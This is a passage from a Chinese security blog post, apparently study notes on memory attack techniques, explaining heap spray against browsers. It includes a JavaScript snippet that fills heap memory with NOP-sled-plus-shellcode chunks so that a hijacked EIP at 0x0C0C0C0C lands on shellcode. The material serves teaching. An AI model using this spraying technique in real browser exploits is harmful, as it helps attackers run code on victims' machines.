的场景下有局限。</p><p>当然，如果<strong>内存中有多个对象且能溢出到下一个对象空间中去</strong>，“连续性覆盖” 还是有攻击机会的，如下图<br><img src="/2022/04/23/%E5%BD%A2%E5%BD%A2%E8%89%B2%E8%89%B2%E7%9A%84%E5%86%85%E5%AD%98%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/image-20220420104319811.png" alt="image-20220420104319811"></p><h1 id="heap-spray堆与栈的协同攻击"><a class="markdownIt-Anchor" href="#heap-spray堆与栈的协同攻击"></a> Heap Spray：堆与栈的协同攻击</h1><p>攻击浏览器时，常常结合使用堆和栈的协同利用漏洞。</p><p>（1）当浏览器或插件中<strong>存在溢出漏洞</strong>时，攻击者就可以生成一个特殊的 HTML 文件来触发这个漏洞。</p><p>（2）漏洞触发后最终都能获得 EIP</p><p>（3）有时我们很难在浏览器中布置完整的 shellcode</p><p>（4）JavaScript 可以申请堆内存，所以，把 shellcode 通过 JavaScript 布置在堆中。</p><p>如何定位 shellcode 呢？Heap Spray 技术就是为了解决这个问题。</p><p>**攻击思路：**在使用 Heap Spray时，一般会人为的把 EIP 指向堆区的 <code>0x0C0C0C0C</code> 位置，然后用 JavaScript 申请大量堆内存，并用包含着 0x90 和 shellcode 的 ”内存片“ 覆盖这些内存。</p><p>JavaScript 会从内存低址向高址分配内存，因此申请内存超过 200MB（200MB = 200*1024*1024 = 0x0C800000 &gt; 0x0C0C0C0C）后，0x0C0C0C0C 将被含有 shellcode 的内存片覆盖。只要 0x90 能命中 0x0C0C0C0C 的位置，shellcode 最终就能执行。<br><img src="/2022/04/23/%E5%BD%A2%E5%BD%A2%E8%89%B2%E8%89%B2%E7%9A%84%E5%86%85%E5%AD%98%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/image-20220423205602972.png" alt="image-20220423205602972"></p><p>使用下面 JavaScript 代码产生的内存片来覆盖内存。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">var nop=unescape(<span class="string">&quot;%u9090%u9090&quot;</span>);</span><br><span class="line"><span class="keyword">while</span> (nop.length&lt;= <span class="number">0x100000</span>/<span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line">	nop+=nop;</span><br><span class="line">&#125;<span class="comment">//生成一个 1MB 大小充满 0x90 的数据块</span></span><br><span class="line">nop = nop.substring(<span class="number">0</span>, <span class="number">0x100000</span>/<span class="number">2</span> - <span class="number">32</span>/<span class="number">2</span> - <span class="number">4</span>/<span class="number">2</span> - shellcode.length - <span class="number">2</span>/<span class="number">2</span> );</span><br><span class="line">var slide = new Arrary();</span><br><span class="line"><span class="keyword">for</span> (var i=<span class="number">0</span>; i&lt;<span class="number">200</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">	slide[i] = nop + shellcode</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码说明：</p><p>（1）每个内存片大小为 1MB</p><p>（2）首先产生一个大小为 1MB 且全部被 0x90 填满的内存。</p><p>（3）由于 JavaScript 会为申请到的内存填上一些额外的信息，为了保证内存片恰好是 1MB，我们将这些额外信息所占的空间减去。</p><table><thead><tr><th>额外信息</th><th>SIZE</th><th>说 明</th></tr></thead><tbody><tr><td>malloc header</td><td>32 bytes</td><td>堆块信息</td></tr><tr><td>string length</td><td>4 bytes</td><td>表示字符串长度</td></tr><tr><td>terminator</td><td>2 bytes</td><td>字符串结束符，两个字节的 NULL</td></tr></tbody></table><p>（4）最终我们将使用 200 个这种形式的内存片来覆盖堆内存，只要其中任意一片的 nop 区能够覆盖 0x0C0C0C0C，攻击就可以成功</p><p><img src="/2022/04/23/%E5%BD%A2%E5%BD%A2%E8%89%B2%E8%89%B2%E7%9A%84%E5%86%85%E5%AD%98%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/image-20220423210203879.png" alt="image-20220423210203879"></p><p>**为什么采用 1MB 大小作为内存片的单位呢？**在 Heap Spray 时，内存片相对于 shellcode 和额外的内存信息来说应该“足够大”，这样 nop 区域命中 <code>0x0C0C0C0C</code> 的几率将相对增加；如果内存片较小， shellcode 或额外的内存信息将有可能覆盖 <code>0x0C0C0C0C</code>，导致溢出失败。 1MB的内存相对于 200 字节左右的 shellcode，可以让 exploit 拥有足够的稳定性。</p><blockquote><p>参考：《0day,软件安全漏洞分析技术》</p></blockquote></div><div class="article-footer"><blockquote class="mt-2x"><ul class="post-copyright list-unstyled"><li class="post-copyright-link hidden-xs"><strong>本文链接：</strong> <a href="https://www.rgzzplus.com/2022/04/23/%E5%BD%A2%E5%BD%A2%E8%89%B2%E8%89%B2%E7%9A%84%E5%86%85%E5%AD%98%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/" title="形形色色的内存攻击技术" target="_blank" rel="external">https://www.rgzzplus.com/2022/04/23/形形色色的内存攻击技术/</a></li><li class="post-copyright-license"><strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="http://creativecommons.org/licenses/by/4.0/deed.zh" target="_blank" rel="external">CC BY 4.0 CN协议</a> 许可协议。转载请注明出处！</li></ul></blockquote><div class="panel panel-default panel-badger"><div class="panel-body"><figure class="media"><div class="media-left"><a href="https://github.com/rgzz-zq" target="_blank" class="img-burn thumb-sm visible-lg"><img src="/images/avatar.jpg" class="img-rounded w-full" alt=""></a></div><div class="media-body"><h3 class="media-heading"><a href="https://github.com/rgzz-zq" target="_blank"><span class="text-dark">人工智障plus</span><small class="ml-1x"></small></a></h3><div>一只网安菜鸟。</div></div></figure></div></div></div></article><section id="comments"></section></div><nav class="bar bar-footer clearfix" data-stick-bottom><div class="bar-inner"><ul class="pager pull-left"><li class="prev"><a href="/2022/05/06/%E5%85%B6%E5%AE%83%E7%B1%BB%E5%9E%8B%E7%9A%84%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E/" title="其它类型的软件漏洞"><i class="icon icon-angle-left" aria-hidden="true"></i><span>&nbsp;&nbsp;上一篇</span></a></li><li class="next"><a href="/2022/04/15/%E5%A0%86%E6%BA%A2%E5%87%BA/" title="堆溢出"><span>下一篇&nbsp;&nbsp;</span><i class="icon icon-angle-right" aria-hidden="true"></i></a></li><li class="toggle-toc"><a class="toggle-btn" data-toggle="collapse" href="#collapseToc" aria-expanded="false" title="文章目录" role="button"><span>[&nbsp;</span><span>文章目录</span> <i class="text-collapsed icon icon-anchor"></i> <i class="text-in icon icon-close"></i> <span>]</span></a></li></ul><div class="bar-right"><div class="share-component" data-sites="weibo,qq,wechat,facebook,twitter" data-mobile-sites="weibo,qq,qzone"></div></div></div></nav></main><footer class="footer" itemscope itemtype="http://schema.org/WPFooter"><ul class="social-links"><li><a href="https://github.com/rgzz-zq" target="_blank" title="Github" data-toggle="tooltip" data-placement="top"><i class="icon icon-github"></i></a></li><li><a href="/atom.xml" target="_blank" title="Rss" data-toggle="tooltip" data-placement="top"><i class="icon icon-rss"></i></a></li></ul><div class="copyright">&copy; 2022 rgzzplus<div class="publishby">Theme by <a href="https://github.com/cofess" target="_blank">cofess </a>base on <a href="https://github.com/cofess/hexo-theme-pure" target="_blank">pure</a>.</div></div></footer><script src="//cdn.jsdelivr.net/npm/jquery@1.12.4/dist/jquery.min.js"></script><script>window.jQuery||document.write('<script src="js/jquery.min.js"><\/script>')</script><script src="/js/plugin.min.js"></script><script src="/js/application.js"></script><script>window.INSIGHT_CONFIG={TRANSLATION:{POSTS:"文章",PAGES:"页面",CATEGORIES:"分类",TAGS:"标签",UNTITLED:"(未命名)"},ROOT_URL:"/",CONTENT_URL:"/content.json"}</script><script src="/js/insight.js"></script><script src="//cdn.jsdelivr.net/npm/gitalk@1.6.2/dist/gitalk.min.js"></script><script src="//cdn.jsdelivr.net/npm/blueimp-md5@2.10.0/js/md5.min.js"></script><script type="text/javascript">var gitalk=new Gitalk({clientID:"57d553a3572bd138df53",clientSecret:"f68b8f839d80ce3c3f13201f2d26843d46fc1ade",repo:"rgzz-zq.github.io",owner:"rgzz-zq",admin:["rgzz-zq"],id:md5(location.pathname),distractionFreeMode:!0,language:"zh-CN",enableHotKey:"true"});gitalk.render("comments")</script><script src="//cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.3.5/dist/jquery.fancybox.min.js"></script><script>$(document).ready(function(){$("article img").not("[hidden]").not(".panel-body img").each(function(){var a,t,n=$(this),e=n.attr("alt"),r=n.parent("a");r.length<1&&(-1!=(t=(a=this.getAttribute("src")).lastIndexOf("?"))&&(a=a.substring(0,t)),r=n.wrap('<a href="'+a+'"></a>').parent("a")),r.attr("data-fancybox","images"),e&&r.attr("data-caption",e)}),$().fancybox({selector:'[data-fancybox="images"]',hash:!1,loop:!1})})</script><script defer>var _hmt=_hmt||[];!function(){var e=document.createElement("script");e.src="//hm.baidu.com/hm.js?94cb135e2b01d42780f4972cb63e3884";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)}()</script></body></html>